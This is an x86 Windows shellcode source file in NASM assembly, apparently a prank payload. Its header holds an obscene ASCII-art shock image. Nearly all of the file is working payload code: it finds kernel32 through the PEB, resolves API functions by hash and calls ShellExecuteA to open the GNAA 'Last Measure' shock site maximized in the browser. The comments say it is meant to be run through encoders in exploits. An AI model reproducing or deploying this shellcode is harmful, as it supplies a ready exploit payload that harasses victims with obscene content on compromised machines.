;
; * g o a t s e x * g o a t s e x * g o a t s e x *
; g                                               g  
; o /     \             \            /    \       o
; a|       |             \          |      |      a
; t|       `.             |         |       :     t
; s`        |             |        \|       |     s
; e \       | /       /  \\\   --__ \\       :    e
; x  \      \/   _--~~          ~--__| \     |    x  
; *   \      \_-~                    ~-_\    |    *
; g    \_     \        _.--------.______\|   |    g
; o      \     \______// _ ___ _ (_(__>  \   |    o
; a       \   .  C ___)  ______ (_(____>  |  /    a
; t       /\ |   C ____)/      \ (_____>  |_/     t
; s      / /\|   C_____)       |  (___>   /  \    s
; e     |   (   _C_____)\______/  // _/ /     \   e
; x     |    \  |__   \\_________// (__/       |  x
; *    | \    \____)   `----   --'             |  *
; g    |  \_          ___\       /_          _/ | g
; o   |              /    |     |  \            | o
; a   |             |    /       \  \           | a
; t   |          / /    |         |  \           |t
; s   |         / /      \__/\___/    |          |s
; e  |           /        |    |       |         |e
; x  |          |         |    |       |         |x
; * g o a t s e x * g o a t s e x * g o a t s e x *
; 
; Last Measure is a classic Internet staple by the GNAA. It's probably one of
; the worst things you could do to prank someone, considering all the horrible
; stuff it does. And now it's shellcode.
;
; Launches Last Measure in the user's default browser.
;
; 282 bytes, null bytes all over the place. Intended for use with encoders.
;
; frank2 <frank2 [8] dc949 [D] org>

      global main

_main:
      jmp   dataOffset

getFuncByHash:
      mov   esi,[esp+8]
      mov   edi,[esi+0x3C]       ; dos->e_lfanew 
      add   edi,esi
      mov   ecx,[edi+0x78]       ; export data 
      add   ecx,esi
      mov   ebx,[ecx+0x20]       ; AddressOfNames 
      add   ebx,esi
      xor   eax,eax
      push  ecx

searchForFunc:
      mov   edx,[ebx+eax*4]
      add   edx,esi
      mov   edi,0x554E4441

hashString:
      movzx ecx,byte [edx]
      test  ecx,ecx
      jz    short finishHash

rolRolFightDaPowa:
      xor   edi,ecx
      rol   edi,cl
      shr   ecx,1
      jnz   short rolRolFightDaPowa
      inc   edx
      jmp   short hashString

finishHash:
      or    edi,0x10101010
      cmp   edi,[esp+8]
      jz    short foundHash
      inc   eax
      jmp   short searchForFunc

foundHash:
      pop   ebx
      mov   edi,[ebx+0x1c]
      add   edi,esi
      mov   ebx,[ebx+0x24]
      add   ebx,esi
      movzx ebx,word [ebx+eax*2]
      mov   ebx,[edi+ebx*4]
      add   ebx,esi
      pop   eax                        ; fix the stack 
      pop   edx                        ; no idea why I did it this way 
      pop   edx                        ; but I had some reason... 
      push  eax                        ; it had to do with null bytes 
      ret                        

beginCode:
      pop   ebp
      xor   ecx,ecx
      mov   esi,[fs:ecx+0x30]          ; PEB 
      mov   esi,[esi+0xC]              ; Ldr 
      mov   esi,[esi+0xC]              ; linked list of loaded modules 
      mov   esi,[esi]                  ; loader info for ntdll.dll 
      push  dword [esi+0x18]           ; ntdll.dll image data 
      mov   esi,[esi]                  ; loader info for kernel32.dll 
      push  dword [esi+0x18]           ; kernel32.dll image data 
      push  dword [esp]                ; "                     " 
      push  dword [ebp]                ; ExitThread hash 
      call  getFuncByHash
      cmp   dword [ebx],0x4C44544E     ; if this is the real ExitThread, it 
                                       ;    won't start with NTDL 
      jnz   hasExitThread              ; we have ExitThread, resume 
      push  dword [esp+4]              ; ntdll.dll image data 
      push  dword [ebp+4]              ; RtlExitUserThread hash 
      call  getFuncByHash

hasExitThread:
      mov   [ebp],ebx                  ; store the exit func here 

      push  dword [esp]                ; kernel32.dll image data 
      push  dword [ebp+8]              ; LoadLibraryA hash 
      call  getFuncByHash
      mov   [ebp+8],ebx                ; store LoadLibraryA function 


      lea   eax,[ebp+0x10]             ; shell32.dll string 
      push  eax
      call  [ebp+8]                    ; load shell32.dll 
      push  eax                        ; shell32.dll image data 
      push  dword [ebp+0xC]            ; ShellExecuteA hash 
      call  getFuncByHash
      mov   [ebp+0xC],ebx              ; ShellExecuteA function 

      xor   eax,eax
      lea   ebx,[ebp+0x1C]             ; explorer.exe 
      lea   edx,[ebp+0x29]             ; last measure url 
      push  3                          ; SW_MAXIMIZE because we're assholes. 
      push  eax                        ; don't worry about the root dir 
      push  edx                        ; url is the param 
      push  ebx                        ; explorer is the file 
      push  eax                        ; don't care about the operation 
      push  eax                        ; or the HWND owner 
      call  [ebp+0xC]                  ; fire in the hole! 

      xor   eax,eax
      push  eax
      call [ebp]                       ; run awaaaaay 

dataOffset:
      call  beginCode

      dd    0x58159F36                 ; ExitThread
      dd    0x795D941E                 ; RtlExitUserThread
      dd    0xF816FF93                 ; LoadLibraryA
      dd    0x14DCDE72                 ; ShellExecuteA
      db    "shell32.dll",0
      db    "explorer.exe",0
      db    "http://hackers.on.nimp.org",0
